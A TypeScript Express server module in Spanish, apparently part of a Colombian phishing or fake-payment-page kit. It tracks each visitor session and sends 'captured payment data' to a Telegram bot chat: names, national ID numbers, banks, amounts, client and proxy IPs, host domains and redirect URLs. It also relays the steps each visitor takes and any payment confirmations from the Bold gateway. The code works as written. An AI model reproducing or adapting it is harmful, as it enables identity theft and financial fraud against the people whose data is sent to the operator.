import { Request, Response } from 'express';
import { env } from '../config/env';

type Session = { messageId?: number; lines: string[]; chain: Promise<void> };
const sessions = new Map<string, Session>();

function tg(method: string, body: unknown) {
  return fetch(`https://api.telegram.org/bot${env.telegramBotToken}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  }).then((r) => r.json() as Promise<{ ok: boolean; result?: { message_id: number } }>);
}

export function notifySessionPayment(
  sid: string,
  data: {
    nombre: string;
    monto: string;
    cc: string;
    banco: string;
    url?: string;
    proxyIp?: string;
    clientIp?: string;
    host?: string;
    gateway?: string;
  }
) {
  if (!env.telegramBotToken || !env.telegramChatId) return;
  const s = sessions.get(sid) ?? { lines: [], chain: Promise.resolve() };
  sessions.set(sid, s);

  const time = new Date().toLocaleTimeString('es-CO', { hour12: false, timeZone: 'America/Bogota' });
  const gwLabel = (data.gateway || 'PASARELA').toUpperCase();
  const paymentLine = `\n💳 [DATOS DE PAGO CAPTADOS - ${gwLabel}]\n• Nombre: ${data.nombre}\n• Monto: $${Number(data.monto).toLocaleString('es-CO')} COP\n• CC/Doc: ${data.cc}\n• Banco: ${data.banco}${data.host ? `\n• 📍 Dominio/Host: ${data.host}` : ''}${data.clientIp ? `\n• 👤 IP Cliente: ${data.clientIp}` : ''}${data.proxyIp ? `\n• 🌐 IP Proxy: ${data.proxyIp}` : ''}${data.url ? `\n• Redirigido a: ${data.url}` : ''}`;
  s.lines.push(`${time} ${paymentLine}`);

  s.chain = s.chain.then(async () => {
    const text = `🧭 Sesión ${sid.slice(0, 8)}\n${s.lines.join('\n')}`;
    try {
      if (s.messageId) {
        await tg('editMessageText', { chat_id: env.telegramChatId, message_id: s.messageId, text });
      } else {
        const r = await tg('sendMessage', { chat_id: env.telegramChatId, text });
        if (r.ok && r.result) s.messageId = r.result.message_id;
      }
    } catch {
      // Ignorar fallos de Telegram.
    }
  });
}

export function notifySessionPaymentConfirmed(
  sid: string,
  data: {
    monto: number;
    reference: string;
    paymentId?: string;
    paymentMethod?: string;
    status: string;
  }
) {
  if (!env.telegramBotToken || !env.telegramChatId) return;
  const s = sessions.get(sid) ?? { lines: [], chain: Promise.resolve() };
  sessions.set(sid, s);

  const time = new Date().toLocaleTimeString('es-CO', { hour12: false, timeZone: 'America/Bogota' });
  const confirmLine = `\n🎉 [PAGO CONFIRMADO EN BOLD]\n• Monto: $${Number(data.monto).toLocaleString('es-CO')} COP\n• Estado: ${data.status}\n• Referencia: ${data.reference}${data.paymentMethod ? `\n• Método: ${data.paymentMethod}` : ''}${data.paymentId ? `\n• ID Transacción: ${data.paymentId}` : ''}`;
  s.lines.push(`${time} ${confirmLine}`);

  s.chain = s.chain.then(async () => {
    const text = `🧭 Sesión ${sid.slice(0, 8)}\n${s.lines.join('\n')}`;
    try {
      if (s.messageId) {
        await tg('editMessageText', { chat_id: env.telegramChatId, message_id: s.messageId, text });
        await tg('sendMessage', {
          chat_id: env.telegramChatId,
          text: `🚨 💰 ¡PAGO CONFIRMADO EN BOLD!\n• Sesión: ${sid.slice(0, 8)}\n• Monto: $${Number(data.monto).toLocaleString('es-CO')} COP\n• Estado: ${data.status}\n• Ref: ${data.reference}${data.paymentMethod ? `\n• Método: ${data.paymentMethod}` : ''}`,
        });
      } else {
        const r = await tg('sendMessage', { chat_id: env.telegramChatId, text });
        if (r.ok && r.result) s.messageId = r.result.message_id;
      }
    } catch {
      // Ignorar fallos de Telegram.
    }
  });
}

export function postTrack(req: Request, res: Response) {
  const sid = String(req.body?.sessionId ?? '').slice(0, 64).trim();
  const step = String(req.body?.step ?? '').slice(0, 200).trim();
  const detail = String(req.body?.detail ?? '').slice(0, 500).trim();
  if (!sid || !step) return res.status(400).json({ ok: false, error: 'sessionId y step requeridos' });

  res.json({ ok: true });
  if (!env.telegramBotToken || !env.telegramChatId) return;

  const s = sessions.get(sid) ?? { lines: [], chain: Promise.resolve() };
  sessions.set(sid, s);
  const time = new Date().toLocaleTimeString('es-CO', { hour12: false, timeZone: 'America/Bogota' });
  s.lines.push(`${time}  ${step}${detail ? ` — ${detail}` : ''}`);

  s.chain = s.chain.then(async () => {
    const text = `🧭 Sesión ${sid.slice(0, 8)}\n${s.lines.join('\n')}`;
    try {
      if (s.messageId) {
        await tg('editMessageText', { chat_id: env.telegramChatId, message_id: s.messageId, text });
      } else {
        const r = await tg('sendMessage', { chat_id: env.telegramChatId, text });
        if (r.ok && r.result) s.messageId = r.result.message_id;
      }
    } catch {
      // Ignorar fallos de Telegram.
    }
  });
}
